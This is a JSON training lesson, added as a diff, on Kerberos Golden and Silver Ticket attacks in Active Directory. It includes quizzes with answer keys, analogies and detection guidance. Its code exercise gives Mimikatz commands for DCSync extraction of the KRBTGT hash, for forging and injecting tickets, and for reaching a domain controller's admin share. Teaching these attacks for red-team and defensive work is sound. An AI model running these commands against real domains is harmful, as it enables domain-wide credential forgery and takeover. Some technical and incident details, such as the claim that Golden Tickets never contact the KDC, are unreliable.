@@ -1,0 +1,109 @@
+{
+  "lesson_id": "b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6f",
+  "domain": "active_directory",
+  "title": "Golden and Silver Ticket Attacks",
+  "difficulty": 3,
+  "order_index": 36,
+  "prerequisites": ["Extracting Domain Hashes from NTDS.dit"],
+  "concepts": ["Kerberos TGT and TGS ticket structure", "Golden ticket attack mechanics", "Silver ticket attack mechanics", "KRBTGT account and hash extraction", "Detection and prevention strategies"],
+  "estimated_time": 55,
+  "learning_objectives": [
+    "Understand how Golden Ticket attacks forge Kerberos TGTs to achieve persistent domain access",
+    "Explain how Silver Ticket attacks forge TGS tickets for targeted service access",
+    "Extract the KRBTGT hash and service account hashes required for ticket forging",
+    "Create and inject forged tickets using Mimikatz and Impacket tools",
+    "Identify and implement detection and mitigation strategies for Golden and Silver Ticket attacks"
+  ],
+  "post_assessment": [
+    {
+      "question": "What is the primary difference between a Golden Ticket and a Silver Ticket?",
+      "options": [
+        "A Golden Ticket forges a TGS ticket, while a Silver Ticket forges a TGT",
+        "A Golden Ticket forges a TGT using the KRBTGT hash, while a Silver Ticket forges a TGS ticket using a service account hash",
+        "A Golden Ticket requires domain admin, while a Silver Ticket requires local admin",
+        "A Golden Ticket works on Windows, while a Silver Ticket works on Linux"
+      ],
+      "correct_answer": "A Golden Ticket forges a TGT using the KRBTGT hash, while a Silver Ticket forges a TGS ticket using a service account hash",
+      "explanation": "A Golden Ticket forges a Ticket Granting Ticket (TGT) using the KRBTGT account's NTLM hash, granting access to any service in the domain. A Silver Ticket forges a Ticket Granting Service (TGS) ticket using a specific service account's hash, granting access only to that particular service. The key difference is scope: Golden = entire domain, Silver = specific service."
+    },
+    {
+      "question": "Why is the KRBTGT account critical for Golden Ticket attacks?",
+      "options": [
+        "KRBTGT is the default domain admin account",
+        "KRBTGT's hash is used to sign and encrypt TGTs, so possessing it allows forging valid TGTs",
+        "KRBTGT is the only account that can create new domain users",
+        "KRBTGT controls the DNS records for the domain"
+      ],
+      "correct_answer": "KRBTGT's hash is used to sign and encrypt TGTs, so possessing it allows forging valid TGTs",
+      "explanation": "The KRBTGT account's NTLM hash is used by the KDC to encrypt and sign all TGTs. If an attacker obtains this hash, they can forge TGTs that are cryptographically valid — the domain controller will accept them because they are properly signed with the KRBTGT key."
+    },
+    {
+      "question": "Which Kerberos vulnerability does a Silver Ticket exploit?",
+      "options": [
+        "The KDC does not verify TGS tickets with other KDCs",
+        "The service does not verify the PAC with the KDC, accepting the forged TGS ticket directly",
+        "The TGT expiration time is not checked properly",
+        "Kerberos allows anonymous ticket requests"
+      ],
+      "correct_answer": "The service does not verify the PAC with the KDC, accepting the forged TGS ticket directly",
+      "explanation": "In a Silver Ticket attack, the attacker forges a TGS ticket using the service account's hash. The target service accepts the ticket without verifying the Privilege Attribute Certificate (PAC) with the KDC. This is because Kerberos is designed so that the service can locally decrypt the TGS ticket using its own hash, without needing to contact the KDC — but this means a forged ticket will also be accepted."
+    },
+    {
+      "question": "What is the most effective mitigation for Golden Ticket attacks?",
+      "options": [
+        "Disable the KRBTGT account",
+        "Reset the KRBTGT password twice and monitor for forged tickets",
+        "Block port 88 (Kerberos) on the firewall",
+        "Enable Windows Defender"
+      ],
+      "correct_answer": "Reset the KRBTGT password twice and monitor for forged tickets",
+      "explanation": "Resetting the KRBTGT password invalidates all existing TGTs signed with the old hash. The password must be reset TWICE because Kerberos caches the current and previous hash. Monitoring for Event ID 4624 with forged usernames or abnormal ticket lifetimes detects active Golden Ticket usage."
+    }
+  ],
+  "jim_kwik_principles": ["Visualization", "Association", "Emotion", "Storytelling", "Chunking", "Active Recall", "Spaced Repetition", "Mnemonics", "Teach Back", "Mind Mapping"],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "Why Golden/Silver Tickets Are the Crown Jewels of AD Attacks",
+      "content": "If you compromise Active Directory without understanding Golden and Silver Ticket attacks, you're missing the most powerful persistence mechanisms available. These attacks don't just give you access — they let you CREATE valid authentication tickets out of thin air, bypassing the domain controller entirely after the initial hash extraction. Even if the domain admins change their passwords, a Golden Ticket persists until the KRBTGT password is reset. This is why every red teamer and DFIR specialist must understand these attacks deeply — both to execute them and to detect them."
+    },
+    {
+      "type": "explanation",
+      "title": "Kerberos Ticket Structure: Understanding the Target",
+      "content": "Before attacking Kerberos tickets, you need to understand what you're forging. Kerberos authentication uses two types of tickets:\n\n**Ticket Granting Ticket (TGT):** Issued by the Key Distribution Center (KDC) after successful authentication. The TGT is encrypted with the KRBTGT account's hash. When a user wants to access a service, they present the TGT to the KDC, which then issues a TGS ticket. The TGT contains: the user's SID, group memberships (PAC), timestamp, and expiration time. It's valid for 10 hours by default.\n\n**Ticket Granting Service (TGS) ticket:** Issued by the KDC for a specific service. Encrypted with the service account's hash. The service decrypts it locally without contacting the KDC. Contains the user's identity, group memberships, and a session key for the client-server communication.\n\n**Key insight:** If you possess the KRBTGT hash, you can forge TGTs for ANY user (including non-existent ones) to access ANY service. If you possess a service account's hash, you can forge TGS tickets to access that specific service WITHOUT contacting the KDC at all. This is the fundamental vulnerability that Golden and Silver Ticket attacks exploit."
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: Golden and Silver Tickets",
+      "content": "Imagine a theme park with a special rule: anyone holding a golden wristband can go on ANY ride, and anyone holding a silver wristband can go on ONE specific ride.\n\nNormally, to get a golden wristband, you have to show your ID at the front gate (authenticate), and the park gives you one. But what if you stole the park's secret stamp that makes wristbands? Now you can make your OWN golden wristbands at home — for yourself, for your friends, even for people who don't exist! The ride operators can't tell the difference because the stamp is the real one.\n\nThat's a Golden Ticket attack. The 'stamp' is the KRBTGT hash, and the 'wristband' is the TGT.\n\nA Silver Ticket is sneakier. Imagine you want to go on just the roller coaster. Normally, the front gate checks your golden wristband and gives you a silver one just for the roller coaster. But if you stole the roller coaster's OWN stamp, you can make silver wristbands without ever going to the front gate! The roller coaster operator doesn't check with the front gate — they just check the stamp, which is real because you used the real stamp.\n\nThat's a Silver Ticket. You skip the KDC entirely and forge tickets directly for a specific service.\n\nThe scary part? Even if the park changes all the employee passwords, your golden wristband still works — because it uses the park's stamp, not an employee's password."
+    },
+    {
+      "type": "code_exercise",
+      "title": "Golden Ticket Attack with Mimikatz",
+      "content": "Step-by-step Golden Ticket creation using Mimikatz. This requires Domain Admin or KRBTGT hash extraction first.\n\n# Step 1: Extract the KRBTGT hash (requires DA or prior hash dump)\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\n# Note the NTLM hash and SID from output\n\n# Step 2: Create a Golden Ticket\n# /domain: target domain\n# /sid: domain SID (from Step 1)\n# /rc4: KRBTGT NTLM hash\n# /user: fake or real username (can be non-existent!)\n# /id: user RID (500 for admin, or any number)\n# /groups: group RIDs (513=Domain Users, 512=Domain Admins, 520=Group Policy Creator Owners)\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /rc4:KRBTGT_NTHASH /id:500 /groups:513,512,520 /ptt\n\n# Step 3: Verify the ticket\nklist\n# You should see a TGT for Administrator@corp.local\n\n# Step 4: Access any service in the domain\nnet use \\\\DC01\\c$\n# You now have Domain Admin access with a forged ticket!\n\n# Silver Ticket example (forging TGS for CIFS on a specific server):\nmimikatz # kerberos::golden /user:NormalUser /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:FILE01.corp.local /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt",
+      "code": "# Step 1: Extract KRBTGT hash\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\n\n# Step 2: Create Golden Ticket\nmimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /rc4:KRBTGT_NTHASH /id:500 /groups:513,512,520 /ptt\n\n# Step 3: Verify\nklist\n\n# Step 4: Access resources\nnet use \\\\DC01\\c$\n\n# Silver Ticket for CIFS service\nmimikatz # kerberos::golden /user:NormalUser /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:FILE01.corp.local /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt",
+      "language": "powershell"
+    },
+    {
+      "type": "real_world",
+      "title": "Real-World: Notable Golden Ticket Incidents",
+      "content": "The 2017 NotPetya attack, attributed to Sandworm (Russian GRU Unit 74455), used Golden Ticket techniques as part of its lateral movement strategy. After initial compromise, attackers extracted the KRBTGT hash and created persistent backdoors that survived password resets for individual accounts.\n\nIn the SolarWinds supply chain compromise (2020), APT29 (Cozy Bear) was observed using Silver Ticket techniques to forge S4U2self and S4U2proxy tickets, allowing them to access Exchange services without ever contacting the KDC after initial compromise. This made detection extremely difficult because no KDC logs were generated for the service access.\n\n**Detection Indicators from Real Incidents:**\n- Event ID 4624 logons with user accounts that don't exist in Active Directory\n- TGT lifetimes exceeding the default 10-hour maximum\n- Tickets encrypted with RC4 when AES is the domain default\n- Privilege Attribute Certificate (PAC) containing group memberships inconsistent with the claimed user\n- Tickets with mismatched replication metadata (different KRBTGT password versions across DCs)\n\n**Lessons Learned:** The organizations that detected these attacks fastest were those monitoring Kerberos event logs for anomalies — specifically Event IDs 4768 (TGT requested), 4769 (TGS requested), and 4770 (TGS used). Regular KRBTGT password resets (at least annually) limit Golden Ticket persistence windows."
+    },
+    {
+      "type": "memory_aid",
+      "title": "Golden vs Silver Ticket Quick Reference Card",
+      "content": "**Golden Ticket** 🔑🥇\n- Forges: TGT (Ticket Granting Ticket)\n- Requires: KRBTGT NTLM hash\n- Access: ANY service in the domain\n- Contacts KDC? NO (after hash extraction)\n- Persistence: Until KRBTGT password is reset TWICE\n- Detection: Event 4624 with non-existent users, abnormal ticket lifetimes\n- Mitigation: Reset KRBTGT password twice, monitor Kerberos events\n\n**Silver Ticket** 🥈\n- Forges: TGS (Ticket Granting Service) ticket\n- Requires: Service account NTLM hash\n- Access: Only the specific service\n- Contacts KDC? NO (service validates locally)\n- Persistence: Until service account password is reset\n- Detection: Service access without preceding TGT request (no 4768 event)\n- Mitigation: Service account password rotation, validate PACs\n\n**Memory Trick:** Golden = Global (any service), Silver = Specific (one service)\nGolden needs the King's key (KRBTGT), Silver needs the Servant's key (service account)"
+    },
+    {
+      "type": "reflection",
+      "title": "Think Like a Defender: Detection Strategy",
+      "content": "You've learned the attacks — now think about defense. Consider these scenarios:\n\n1. You're a SOC analyst and you see Event ID 4768 (TGT requested) for a user 'svc_backup' followed immediately by Event ID 4769 (TGS requested) for the LDAP service on the DC — but 'svc_backup' hasn't authenticated via normal channels. What type of attack might this indicate?\n\n2. Your team discovers that a KRBTGT hash was extracted 30 days ago. You've already changed the KRBTGT password once. Is the organization still vulnerable to Golden Ticket attacks? Why?\n\n3. You notice CIFS service access on FILE01 from a user account, but there's no corresponding TGT request in the domain controller logs. What attack does this suggest?\n\nAnswers: (1) This could indicate a Golden Ticket — a TGT was created for an account that may not have authenticated normally. (2) YES — KRBTGT password must be reset TWICE because the KDC caches the old hash. A single reset means the attacker can still forge tickets with the cached hash. (3) This is a classic Silver Ticket indicator — the service ticket was forged directly without going through the KDC."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Mastering the Art of Ticket Attacks",
+      "content": "Golden and Silver Ticket attacks represent the pinnacle of Active Directory exploitation — they bypass the fundamental authentication mechanism that secures the entire domain. Understanding these attacks deeply means you can both execute them during red team engagements and detect them as a blue teamer. The key insight is this: Kerberos was designed to be a trusted protocol, but when the trust keys (KRBTGT hash, service hashes) are compromised, the entire system falls apart because the cryptographic trust is broken. As you continue your AD security journey, remember that the most powerful attacks often exploit trust relationships rather than software vulnerabilities. In the next lesson, you'll explore ADCS attacks which represent the next evolution in AD exploitation — attacking the certificate infrastructure that underpins modern authentication."
+    }
+  ],
+  "tags": ["Course: SANS-SEC560", "Career Path: Red Teamer"]
+}
